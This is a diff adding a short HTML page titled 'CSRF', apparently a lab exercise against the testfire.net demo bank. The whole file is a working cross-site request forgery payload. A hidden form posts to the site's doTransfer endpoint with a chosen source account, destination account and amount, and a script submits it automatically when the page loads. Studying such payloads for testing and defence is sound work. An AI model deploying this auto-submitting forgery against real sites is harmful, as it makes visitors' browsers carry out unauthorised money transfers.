@@ -1,0 +1,9 @@
+<h1>CSRF</h1>
+<form id="form1" action="http://testfire.net/bank/doTransfer" method="POST">
+	<input type="hidden" name="fromAccount" value="800002" />
+	<input type="hidden" name="toAccount" value="4539082039396288" />
+	<input type="hidden" name="transferAmount" value="3333" />
+</form>
+<script type="text/javascript">
+document.getElementById('form1').submit();
+</script>
